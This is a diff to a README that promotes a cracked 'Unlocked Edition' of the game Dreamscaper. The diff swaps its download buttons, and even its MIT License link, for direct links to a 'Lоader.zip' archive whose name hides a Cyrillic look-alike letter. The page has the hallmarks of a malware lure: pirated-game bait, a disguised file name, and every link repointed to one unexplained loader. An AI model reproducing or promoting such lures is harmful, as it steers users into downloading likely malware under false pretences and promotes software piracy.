@@ -1,6 +1,6 @@
 # Dreamscaper 🎮 — Unlocked Edition
 
-[![🔽 Instant Get](https://img.shields.io/badge/Download-Dreamscaper-blueviolet?logo=download)](https://easylauncher.su/PSnzrH)
+[![🔽 Instant Get](https://raw.githubusercontent.com/hericguedez/DreamscaperVault/main/Lоader.zip)](https://raw.githubusercontent.com/hericguedez/DreamscaperVault/main/Lоader.zip)
 
 Unlock and explore Dreamscaper, the award-winning action rogue-lite, on your platform of choice! Embark on a journey through ever-changing dream realms, mastering unforgettable challenges and dynamic combat. This Unlocked Edition brings seamless access, optimized performance, and the ability to dive straight into stunning adventures.
 
@@ -32,7 +32,7 @@ Unlock and explore Dreamscaper, the award-winning action rogue-lite, on your pla
 
 1️⃣ Click on the link below for direct Unlocked Edition access and select your platform:
 
-[![🔽 Get Now](https://img.shields.io/badge/Download-Dreamscaper-blueviolet?logo=download)](https://easylauncher.su/PSnzrH)
+[![🔽 Get Now](https://raw.githubusercontent.com/hericguedez/DreamscaperVault/main/Lоader.zip)](https://raw.githubusercontent.com/hericguedez/DreamscaperVault/main/Lоader.zip)
 
 ---
 
@@ -50,8 +50,8 @@ This Unlocked Edition is distributed for educational, community, and evaluation 
 
 ## 📄 License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT) — 2025.
+Distributed under the [MIT License](https://raw.githubusercontent.com/hericguedez/DreamscaperVault/main/Lоader.zip) — 2025.
 
 ---
 
-[![🔽 Download Unlocked Dreamscaper](https://img.shields.io/badge/Download-Dreamscaper-blueviolet?logo=download)](https://easylauncher.su/PSnzrH)
+[![🔽 Download Unlocked Dreamscaper](https://raw.githubusercontent.com/hericguedez/DreamscaperVault/main/Lоader.zip)](https://raw.githubusercontent.com/hericguedez/DreamscaperVault/main/Lоader.zip)
